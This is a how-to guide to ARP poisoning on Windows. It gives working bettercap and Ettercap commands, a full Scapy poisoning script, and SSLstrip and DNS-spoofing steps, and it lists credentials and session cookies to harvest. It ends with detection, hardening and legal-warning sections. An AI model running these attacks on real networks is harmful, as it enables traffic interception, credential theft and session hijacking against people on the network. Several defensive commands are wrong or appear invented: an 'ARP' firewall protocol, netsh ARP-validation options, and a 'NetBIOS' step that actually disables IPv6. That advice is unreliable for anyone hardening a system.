# **ARP Poisoning on Windows: Complete Guide**

## **What is ARP Poisoning?**

**ARP Poisoning** (or ARP Spoofing) is a man-in-the-middle attack where an attacker sends fake ARP messages to a local network. This tricks devices into sending network traffic to the attacker's machine instead of the legitimate destination.

### **Simple Analogy**
Imagine a neighborhood where houses communicate by mail:
- Normally: House A sends mail to House B directly
- ARP Poisoned: House A is tricked into sending ALL mail to Attacker's house first
- Attacker reads/copies the mail, then forwards it to House B
- Neither House A nor House B knows the mail was intercepted

---

## **How ARP Works Normally (Legitimate)**

**ARP** = Address Resolution Protocol
- Maps **IP addresses** to **MAC addresses**
- Every device has an ARP cache (local table)

**Normal ARP Process:**
```
1. Computer A (192.168.1.10) wants to talk to Router (192.168.1.1)
2. Computer A checks its ARP cache: "Who has 192.168.1.1?"
3. Router responds: "192.168.1.1 is at MAC-address AA:BB:CC:DD:EE:FF"
4. Computer A stores this in ARP cache and sends traffic to that MAC
```

**View ARP Cache in Windows:**
```cmd
C:\> arp -a

Interface: 192.168.1.10 --- 0xb
  Internet Address      Physical Address      Type
  192.168.1.1           aa-bb-cc-dd-ee-ff     dynamic
  192.168.1.20          11-22-33-44-55-66     dynamic
```

---

## **How ARP Poisoning Works**

### **Step-by-Step Attack Process**

**Network Setup:**
- **Victim**: 192.168.1.10 (MAC: VICTIM-MAC)
- **Router**: 192.168.1.1 (MAC: ROUTER-MAC)
- **Attacker**: 192.168.1.100 (MAC: ATTACKER-MAC)

**The Attack:**

```python
# 1. Attacker poisons Victim's ARP cache:
# "I (attacker) am the Router"
Send ARP Reply: "192.168.1.1 is at ATTACKER-MAC"

# 2. Attacker poisons Router's ARP cache:
# "I (attacker) am the Victim"
Send ARP Reply: "192.168.1.10 is at ATTACKER-MAC"

# Result: All traffic between Victim ↔ Router flows through Attacker
```

**Visual Flow:**
```
BEFORE:   Victim (1.10) ↔ Router (1.1)
          Direct communication

AFTER:    Victim (1.10) → Attacker (1.100) → Router (1.1)
          Router (1.1) → Attacker (1.100) → Victim (1.10)
```

---

## **Tools for ARP Poisoning on Windows**

### **1. BetterCAP (Recommended)**
Cross-platform tool with Windows support.

**Installation:**
```powershell
# Install via Chocolatey
choco install bettercap

# Or download from GitHub
# https://github.com/bettercap/bettercap
```

**Basic ARP Spoofing:**
```cmd
# Start bettercap console
bettercap -iface "Ethernet"

# In bettercap console:
> set arp.spoof.targets 192.168.1.10
> arp.spoof on
> net.sniff on
```

**Advanced Configuration:**
```cmd
# Spoof multiple targets
> set arp.spoof.targets 192.168.1.10,192.168.1.20

# Spoof entire subnet
> set arp.spoof.targets 192.168.1.1/24

# Enable full duplex (spoof both directions)
> set arp.spoof.fullduplex true
```

### **2. Cain & Abel (Classic Windows Tool)**
**Warning**: Old (discontinued) but effective. May trigger antivirus.

**Steps:**
1. Launch Cain & Abel
2. Click "Sniffer" tab
3. Click network card icon to activate
4. Click "+" icon to scan network
5. Go to "ARP" tab (bottom pane)
6. Click top toolbar → "ARP Poisoning"
7. Select targets and click OK

### **3. Ettercap (via WSL/Cygwin)**
Can run in Windows Subsystem for Linux:

```bash
# In WSL or Cygwin
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.10/ /192.168.1.1/
```

### **4. Nmap's NSE Script (for Detection)**
```cmd
# Scan for ARP spoofing vulnerabilities
nmap --script arp-scan 192.168.1.0/24
```

---

## **Manual ARP Poisoning with PowerShell**

### **View Current ARP Cache**
```powershell
# Method 1: Using arp command
arp -a

# Method 2: PowerShell
Get-NetNeighbor -AddressFamily IPv4 | Format-Table

# Method 3: More detailed
netsh interface ip show neighbors
```

### **Send Custom ARP Packets (Poofing)**
```powershell
# This requires elevated privileges and raw socket support
# Usually done via C/C++ or Python with WinPcap/Npcap

# Using PowerShell with Npcap:
# 1. Install Npcap (comes with Nmap)
# 2. Use SharpPcap or Packet.Net libraries
```

### **Python with Scapy (Recommended for Advanced)**
```python
# Install: pip install scapy
from scapy.all import *
import time

# Configuration
victim_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"
attacker_mac = "AA:BB:CC:DD:EE:FF"  # Your MAC

def arp_poison():
    # Create poisoned ARP packet for victim
    arp_victim = ARP(op=2, pdst=victim_ip, 
                     psrc=gateway_ip, 
                     hwdst=getmacbyip(victim_ip))
    
    # Create poisoned ARP packet for gateway
    arp_gateway = ARP(op=2, pdst=gateway_ip,
                      psrc=victim_ip,
                      hwdst=getmacbyip(gateway_ip))
    
    print("[*] Starting ARP poisoning...")
    
    while True:
        try:
            send(arp_victim, verbose=False)
            send(arp_gateway, verbose=False)
            time.sleep(2)  # Send every 2 seconds
        except KeyboardInterrupt:
            print("\n[*] Restoring ARP tables...")
            restore_network(victim_ip, gateway_ip)
            break

def restore_network(victim, gateway):
    # Send correct ARP packets to restore
    send(ARP(op=2, pdst=victim, psrc=gateway,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=getmacbyip(gateway)), count=5)
    
    send(ARP(op=2, pdst=gateway, psrc=victim,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=getmacbyip(victim)), count=5)

# Run the attack
arp_poison()
```

---

## **What Can You Do After ARP Poisoning?**

### **1. Network Sniffing (Passive)**
```cmd
# Using Wireshark (GUI)
# Filter: ip.addr == 192.168.1.10

# Using tshark (command-line)
tshark -i "Ethernet" -f "host 192.168.1.10" -w capture.pcap
```

### **2. Credential Harvesting**
- HTTP login pages (usernames/passwords)
- FTP, Telnet, SMTP credentials
- Session cookies
- API keys

### **3. SSL/TLS Decryption (with SSLStrip)**
```cmd
# In BetterCAP
> set http.proxy.sslstrip true
> http.proxy on
```

### **4. DNS Spoofing**
```cmd
# Redirect specific domains
> set dns.spoof.domains google.com,facebook.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on
```

### **5. Session Hijacking**
- Steal authentication cookies
- Take over logged-in sessions

---

## **Detection & Prevention on Windows**

### **How to Detect ARP Poisoning**

#### **1. Manual Detection Commands**
```powershell
# Check for duplicate MAC addresses
arp -a | findstr "dynamic"

# Monitor ARP cache changes
# Save baseline
arp -a > arp_baseline.txt

# Compare later
arp -a | findstr /V /G:arp_baseline.txt

# Using PowerShell continuously
while(1) { Get-NetNeighbor | Where State -eq "Stale"; sleep 5 }
```

#### **2. Built-in Windows Features**
```powershell
# Enable ARP cache validation (Windows 10+)
netsh interface ipv4 set interface "Ethernet" arpvalidate=enabled

# Set ARP cache limits
netsh interface ipv4 set interface "Ethernet" arpcachelimits=512
```

#### **3. Free Detection Tools**
- **XArp** (Graphical ARP monitoring)
- **ARPWatch** (for Windows)
- **Capsa Network Analyzer** (Free edition)

### **Windows Defender Firewall Rules**
```powershell
# Block unexpected ARP replies
New-NetFirewallRule -DisplayName "Block ARP Replies" `
    -Direction Inbound `
    -Protocol ARP `
    -RemoteAddress "LocalSubnet" `
    -Action Block `
    -Enabled True
```

### **Best Prevention Practices**

#### **1. Network-Level Solutions**
```powershell
# Most effective: Port Security on Switches
# This is configured on network switches, not Windows
# Commands for Cisco switches:
switchport port-security
switchport port-security maximum 1
switchport port-security violation restrict
```

#### **2. Windows Hardening**
```powershell
# Disable NetBIOS over TCP/IP
Get-NetAdapter | Set-NetAdapterBinding -ComponentID ms_tcpip6 -Enabled $false

# Use static ARP entries (for critical devices)
arp -s 192.168.1.1 AA-BB-CC-DD-EE-FF

# Enable SMB signing (prevents SMB relay attacks)
Set-SmbClientConfiguration -RequireSecuritySignature $true
```

#### **3. Encryption is Key**
- Use **HTTPS everywhere** (SSL/TLS)
- Enable **HSTS** in browsers
- Use **VPNs** on untrusted networks
- **SSH** instead of Telnet/FTP

#### **4. Network Segmentation**
```powershell
# Use VLANs to separate sensitive traffic
# This requires network switch configuration
```

---

## **Legal & Ethical Considerations**

### **⚠️ WARNING: Legal Status**
ARP poisoning is **ILLEGAL** when:
- Performed without explicit written authorization
- On networks you don't own
- Against systems you don't own
- For malicious purposes (theft, espionage, disruption)

### **Legal Uses Only:**
- Testing **your own** home lab
- Authorized penetration testing (with contract)
- Educational purposes in isolated environments
- Security research on your own equipment

**Penalties**: Can include fines, imprisonment, and civil liability under:
- Computer Fraud and Abuse Act (CFAA)
- State computer crime laws
- Wiretapping laws

---

## **Step-by-Step Lab Setup (Safe Environment)**

### **1. Create Isolated Virtual Lab**
```powershell
# Using VirtualBox/VMware/Hyper-V
# Setup:
# - Kali Linux (Attacker) - 192.168.56.101
# - Windows 10 (Victim)   - 192.168.56.102
# - pfSense (Router/Gateway) - 192.168.56.1

# Network: Host-only or Internal network
# NO BRIDGED CONNECTION to real network!
```

### **2. Configure Windows Victim**
```powershell
# Disable Windows Defender real-time protection (temporarily)
Set-MpPreference -DisableRealtimeMonitoring $true

# Enable network discovery
Set-NetFirewallRule -DisplayGroup "Network Discovery" -Enabled True

# Set static IP
netsh interface ip set address "Ethernet" static 192.168.56.102 255.255.255.0 192.168.56.1
```

### **3. Practice Detection Only**
```powershell
# Monitor without attacking
# Install Wireshark on Windows
# Capture ARP traffic

# Filter: arp
# Look for:
# - Multiple IPs with same MAC
# - Unusual ARP request frequency
# - ARP replies without requests
```

---

## **Quick Reference Commands**

### **For Analysis:**
```cmd
# View ARP cache
arp -a

# Clear ARP cache
arp -d *

# Continuous ping (helps maintain connection)
ping -t 192.168.1.1

# Network statistics
netstat -an
```

### **For Recovery:**
```powershell
# Flush DNS and ARP
ipconfig /flushdns
arp -d *

# Release and renew IP
ipconfig /release
ipconfig /renew

# Reset TCP/IP stack
netsh int ip reset reset.log
```

### **For Monitoring:**
```powershell
# PowerShell ARP monitor
while($true) {
    $arp = arp -a
    if ($arp -match "00-11-22-33-44-55") {
        Write-Warning "Suspicious MAC detected!"
    }
    Start-Sleep -Seconds 2
}
```

---

## **The Bottom Line**

ARP poisoning remains effective because:
1. **ARP has no authentication** (trusts anyone)
2. **Most networks don't implement port security**
3. **Users rarely encrypt all traffic**

**Best Defenses:**
1. **Encrypt everything** (HTTPS, VPN, SSH)
2. **Use static ARP** for critical devices
3. **Enable DHCP snooping** on switches
4. **Monitor ARP traffic** with IDS/IPS
5. **Segment your network** with VLANs

**Remember**: ARP poisoning only works on **local network segments**. Once you understand it, you realize why public WiFi is so dangerous and why encryption (HTTPS/VPN) is absolutely essential.
